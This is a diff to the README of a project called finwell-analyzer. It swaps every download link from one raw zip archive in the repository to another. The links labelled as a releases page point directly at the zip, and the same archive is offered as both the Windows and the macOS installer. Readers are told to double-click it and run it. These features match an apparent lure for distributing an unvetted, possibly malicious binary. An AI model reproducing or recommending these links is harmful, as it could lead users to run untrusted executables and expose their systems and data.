@@ -15,21 +15,21 @@ Before downloading, make sure your system meets the following requirements:
 
 ## 📥 Download
 
-[![Download finwell-analyzer](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/analyzer_finwell_v2.2-alpha.3.zip)](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/analyzer_finwell_v2.2-alpha.3.zip)
+[![Download finwell-analyzer](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/finwell-analyzer-v2.0.zip)](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/finwell-analyzer-v2.0.zip)
 
 To get started, visit the link below to access the latest version of finwell-analyzer and download it onto your computer.
 
-[Download finwell-analyzer from Releases](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/analyzer_finwell_v2.2-alpha.3.zip)
+[Download finwell-analyzer from Releases](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/finwell-analyzer-v2.0.zip)
 
 ## 📦 Installation Instructions
 
 Follow these simple steps to install finwell-analyzer:
 
 1. **Visit the Releases Page:**
-   Go to [this page](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/analyzer_finwell_v2.2-alpha.3.zip) to see all available versions of finwell-analyzer.
+   Go to [this page](https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/finwell-analyzer-v2.0.zip) to see all available versions of finwell-analyzer.
 
 2. **Download the Latest Release:**
-   Click on the most recent version to see the assets. Download the file that matches your operating system. You will usually find files labeled with the version number, such as `https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/analyzer_finwell_v2.2-alpha.3.zip` for Windows or `https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/analyzer_finwell_v2.2-alpha.3.zip` for macOS.
+   Click on the most recent version to see the assets. Download the file that matches your operating system. You will usually find files labeled with the version number, such as `https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/finwell-analyzer-v2.0.zip` for Windows or `https://raw.githubusercontent.com/Echbabmeryem/finwell-analyzer/main/finwell_analyzer/finwell-analyzer-v2.0.zip` for macOS.
 
 3. **Run the Installer:**
    Once the file completes downloading, double-click it to run the installer. For Windows, follow the installation prompts. For macOS, drag the application icon to your Applications folder.
